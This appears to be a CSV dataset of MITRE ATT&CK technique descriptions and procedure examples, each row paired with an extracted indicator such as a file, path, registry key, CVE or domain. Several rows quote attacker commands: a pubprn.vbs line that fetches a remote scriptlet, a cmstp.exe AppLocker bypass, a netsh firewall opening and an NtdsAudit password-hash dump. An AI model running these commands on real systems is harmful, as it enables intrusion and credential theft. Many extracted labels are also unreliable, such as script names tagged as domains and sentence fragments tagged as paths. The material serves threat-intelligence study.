T1547.010,Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor  API call to set a DLL to be loaded at startup.   [1]    This DLL can be located in  C:\Windows\System32  and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.   [2]    Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors .    The Registry key contains entries for the following:   Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors
T1547.010,Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor  API call to set a DLL to be loaded at startup.   [1]    This DLL can be located in  C:\Windows\System32  and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.   [2]    Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors .    The Registry key contains entries for the following:   Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",Description,file,spoolsv.exe
T1547.010,Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor  API call to set a DLL to be loaded at startup.   [1]    This DLL can be located in  C:\Windows\System32  and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.   [2]    Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors .    The Registry key contains entries for the following:   Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",Description,path,C:\Windows\System32
T1569.001,Launchctl,XCSSET  loads a system level launchdaemon using the  launchctl load -w  command from  /System/Librarby/LaunchDaemons/ssh.plist .   [8],Procedure Examples,path,/System/Librarby/LaunchDaemons/ssh.plist
T1210,Exploitation of Remote Services,Dragonfly  has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.   [10],Procedure Examples,cve,CVE-2020-1472
T1210,Exploitation of Remote Services,Earth Lusca  has used  Mimikatz  to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).   [11],Procedure Examples,cve,CVE-2020-1472
T1210,Exploitation of Remote Services,FIN7  has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.   [17],Procedure Examples,cve,CVE-2020-1472
T1210,Exploitation of Remote Services,InvisiMole  can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.   [23],Procedure Examples,cve,CVE-2017-0144
T1210,Exploitation of Remote Services,InvisiMole  can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.   [23],Procedure Examples,cve,CVE-2019-0708
T1210,Exploitation of Remote Services,Lucifer  can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).   [24],Procedure Examples,cve,CVE-2017-0144
T1210,Exploitation of Remote Services,menuPass  has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).   [25],Procedure Examples,cve,CVE-2020-1472
T1210,Exploitation of Remote Services,MuddyWater  has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).   [26],Procedure Examples,cve,CVE-2020-1472
T1210,Exploitation of Remote Services,Wizard Spider  has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.   [39]      [40]      [41],Procedure Examples,cve,CVE-2020-1472
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,domain,net.com
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,path,"/C net user  will execute ""net.com"
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,example.exe
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,cmd.exe
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,net.exe
T1090,Proxy,"HARDRAIN  uses the command  cmd.exe /c netsh firewall add portopening TCP 443 ""adp""  and makes the victim machine function as a proxy server.   [19]",Procedure Examples,file,cmd.exe
T1497,Virtualization or Sandbox Evasion,"Metamorfo  has embedded a ""vmdetect.exe"" executable to identify virtual machines at the beginning of execution.   [16]",Procedure Examples,file,vmdetect.exe
T1083,File and Directory Discovery,Cannon  can obtain victim drive information as well as a list of folders in C:\Program Files.   [57],Procedure Examples,path,C:\Program
T1083,File and Directory Discovery,A variant of  Elise  executes  dir C:\progra~1  when initially run.   [105]      [106],Procedure Examples,path,C:\progra
T1083,File and Directory Discovery,FYAnti  can search the  C:\Windows\Microsoft.NET\  directory for files of a specified size.   [120],Procedure Examples,domain,microsoft.net
T1083,File and Directory Discovery,FYAnti  can search the  C:\Windows\Microsoft.NET\  directory for files of a specified size.   [120],Procedure Examples,path,C:\Windows\Microsoft.NET
T1083,File and Directory Discovery,JPIN  can enumerate drives and their types. It can also change file permissions using cacls.exe.   [144],Procedure Examples,file,cacls.exe
T1083,File and Directory Discovery,"Kwampirs  collects a list of files and directories in C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"" .   [162]",Procedure Examples,path,"C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"
T1083,File and Directory Discovery,"Kwampirs  collects a list of files and directories in C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"" .   [162]",Procedure Examples,path,C:\windows\TEMP
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,ls.py
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,recentfiles.py
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,pwd.py
T1083,File and Directory Discovery,Winnti Group  has used a program named ff.exe to search for specific documents on compromised hosts.   [308],Procedure Examples,file,ff.exe
T1049,System Network Connections Discovery,Magic Hound  has used quser.exe to identify existing RDP connections.   [49],Procedure Examples,file,quser.exe
T1049,System Network Connections Discovery,TeamTNT  has run  netstat -anp  to search for rival malware connections.   [82]     TeamTNT  has also used  libprocesshider  to modify  /etc/ld.so.preload .   [83],Procedure Examples,path,/etc/ld.so
T1049,System Network Connections Discovery,TeamTNT  has run  netstat -anp  to search for rival malware connections.   [82]     TeamTNT  has also used  libprocesshider  to modify  /etc/ld.so.preload .   [83],Procedure Examples,domain,ld.so
T1049,System Network Connections Discovery,Threat Group-3390  has used  net use  and  netstat  to conduct internal discovery of systems. The group has also used  quser.exe  to identify existing RDP sessions on a victim.   [84],Procedure Examples,file,quser.exe
T1497.001,System Checks,"Darkhotel  malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with  .Md5.exe , and if the program is executed from the root of the C:\ drive, as well as checks for sandbox-related libraries.   [10]      [11]",Procedure Examples,file,Md5.exe
T1497.001,System Checks,GoldMax  will check if it is being run in a virtualized environment by comparing the collected MAC address to  c8:27:cc:c2:37:5a .   [20]      [21],Procedure Examples,mac-address,c8:27:cc:c2:37:5a
T1497.001,System Checks,"Saint Bot  has run several virtual machine and sandbox checks, including checking if  Sbiedll.dll  is present in a list of loaded modules, comparing the machine name to  HAL9TH  and the user name to  JohnDoe , and checking the BIOS version for known virtual machine identifiers.   [48]",Procedure Examples,file,Sbiedll.dll
T1497.001,System Checks,SodaMaster  can check for the presence of the Registry key  HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe  before proceeding to its main functionality.   [36],Procedure Examples,registry-key,HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe
T1497.001,System Checks,SodaMaster  can check for the presence of the Registry key  HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe  before proceeding to its main functionality.   [36],Procedure Examples,file,VMwareHostOpen.exe
T1059.006,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the  python.exe  interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.   Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",Description,file,python.exe
T1059.006,Python,Kimsuky  has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.   [23]      [24],Procedure Examples,domain,mailfetcher.py
T1059.006,Python,"TRITON  was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag.   [44]",Procedure Examples,file,trilog.exe
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,url,https://mydomain.com/folder/file.sct
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,domain,mydomain.com
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,ip-address,127.0.0.1
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,file,Cscript.exe
T1046,Network Service Discovery,Chimera  has used the  get -b   -e   -p    command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.   [13],Procedure Examples,file,Get.exe
T1046,Network Service Discovery,"FIN6  used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.   [25]",Procedure Examples,file,osql.exe
T1046,Network Service Discovery,"menuPass  has used tcping.exe, similar to  Ping , to probe port status on systems of interest.   [37]",Procedure Examples,file,tcping.exe
T1546.014,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond  will load any rules from the  /etc/emond.d/rules/  directory and take action once an explicitly defined event takes place.   The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple.emond.plist .   [1]      [2]      [3]      Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.   [1]      [2]      [3]    Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon  service.",Description,path,/sbin/emond  will load any rules from the  /etc/emond.d
T1546.014,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond  will load any rules from the  /etc/emond.d/rules/  directory and take action once an explicitly defined event takes place.   The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple.emond.plist .   [1]      [2]      [3]      Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.   [1]      [2]      [3]    Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon  service.",Description,path,"/private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple"
T1027.004,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.   [1]      Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a  Phishing . Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.   [2]",Description,file,csc.exe
T1027.004,Compile After Delivery,DarkWatchman  has used the  csc.exe  tool to compile a C# executable.   [4],Procedure Examples,file,csc.exe
T1027.004,Compile After Delivery,MuddyWater  has used the .NET csc.exe tool to compile executables from downloaded C# code.   [1],Procedure Examples,file,csc.exe
T1113,Screen Capture,Carberp  can capture display screenshots with the screens_dll.dll plugin.   [32],Procedure Examples,file,screens_dll.dll
T1113,Screen Capture,"Dragonfly  has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).   [52]      [53]      [54]",Procedure Examples,file,scr.exe
T1113,Screen Capture,MarkiRAT  can capture screenshots that are initially saved as ‘scr.jpg’.   [100],Procedure Examples,file,scr.jpg
T1113,Screen Capture,Rover  takes screenshots of the compromised system's desktop and saves them to  C:\system\screenshot.bmp  for exfiltration every 60 minutes.   [146],Procedure Examples,path,C:\system\screenshot.bmp
T1113,Screen Capture,"SLOTHFULMEDIA  has taken a screenshot of a victim's desktop, named it ""Filter3.jpg"", and stored it in the local directory.   [155]",Procedure Examples,file,Filter3.jpg
T1113,Screen Capture,Trojan.Karagany  can take a desktop screenshot and save the file into  \ProgramData\Mail\MailAg\shot.png .   [165]      [166],Procedure Examples,file,shot.png
T1124,System Time Discovery,Carbon  uses the command  net time \127.0.0.1  to get information the system’s time.   [19],Procedure Examples,ip-address,127.0.0.1
T1003.003,NTDS,APT28  has used the ntdsutil.exe utility to export the Active Directory database for credential access.   [3],Procedure Examples,file,ntdsutil.exe
T1003.003,NTDS,"Chimera  has gathered the SYSTEM registry and ntds.dit files from target systems.   [4]     Chimera  specifically has used the NtdsAudit tool to dump the password hashes of domain users via  msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv  and used ntdsutil to copy the Active Directory database.   [5]",Procedure Examples,file,msadcs.exe
T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.    [1]    CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.   Adversaries may supply CMSTP.exe with INF files infected with malicious commands.    [2]    Similar to  Regsvr32  / ""Squiblydoo"", CMSTP.exe may be abused to load and execute DLLs    [3]     and/or COM scriptlets (SCT) from remote servers.    [4]       [5]       [6]    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.   CMSTP.exe can also be abused to  Bypass User Account Control  and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.    [3]       [5]       [6]",Description,path,"/ ""Squiblydoo"", CMSTP.exe"
T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.    [1]    CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.   Adversaries may supply CMSTP.exe with INF files infected with malicious commands.    [2]    Similar to  Regsvr32  / ""Squiblydoo"", CMSTP.exe may be abused to load and execute DLLs    [3]     and/or COM scriptlets (SCT) from remote servers.    [4]       [5]       [6]    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.   CMSTP.exe can also be abused to  Bypass User Account Control  and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.    [3]       [5]       [6]",Description,file,CMSTP.exe
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,path,/s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,file,cmstp.exe
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,path,C:\Users\ADMINI
T1218.003,CMSTP,MuddyWater  has used CMSTP.exe and a malicious INF to execute its  POWERSTATS  payload.   [10],Procedure Examples,file,CMSTP.exe
T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as  LD_PRELOAD  on Linux or  DYLD_INSERT_LIBRARIES  on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.   [1]      [2]      [3]    These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.   [4]      On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the  export  command,  setenv  function, or  putenv  function. Adversaries can also leverage  Dynamic Linker Hijacking  to export variables in a shell or set variables programmatically using higher level syntax such Python’s  os.environ .   On Linux, adversaries may set  LD_PRELOAD  to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.  LD_PRELOAD  can be set via the environment variable or  /etc/ld.so.preload  file.   [1]      [2]    Libraries specified by  LD_PRELOAD  are loaded and mapped into memory by  dlopen()  and  mmap()  respectively.   [5]      [6]       [7]      [8]       On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the  DYLD_INSERT_LIBRARIES  environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.   [9]      [10]      [11]",Description,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as  LD_PRELOAD  on Linux or  DYLD_INSERT_LIBRARIES  on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.   [1]      [2]      [3]    These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.   [4]      On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the  export  command,  setenv  function, or  putenv  function. Adversaries can also leverage  Dynamic Linker Hijacking  to export variables in a shell or set variables programmatically using higher level syntax such Python’s  os.environ .   On Linux, adversaries may set  LD_PRELOAD  to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.  LD_PRELOAD  can be set via the environment variable or  /etc/ld.so.preload  file.   [1]      [2]    Libraries specified by  LD_PRELOAD  are loaded and mapped into memory by  dlopen()  and  mmap()  respectively.   [5]      [6]       [7]      [8]       On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the  DYLD_INSERT_LIBRARIES  environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.   [9]      [10]      [11]",Description,domain,ld.so
T1574.006,Dynamic Linker Hijacking,Hildegard  has modified /etc/ld.so.preload to intercept shared library import functions.   [15],Procedure Examples,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,Hildegard  has modified /etc/ld.so.preload to intercept shared library import functions.   [15],Procedure Examples,domain,ld.so
T1574.006,Dynamic Linker Hijacking,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [16],Procedure Examples,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [16],Procedure Examples,domain,ld.so
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,domain,finder.app
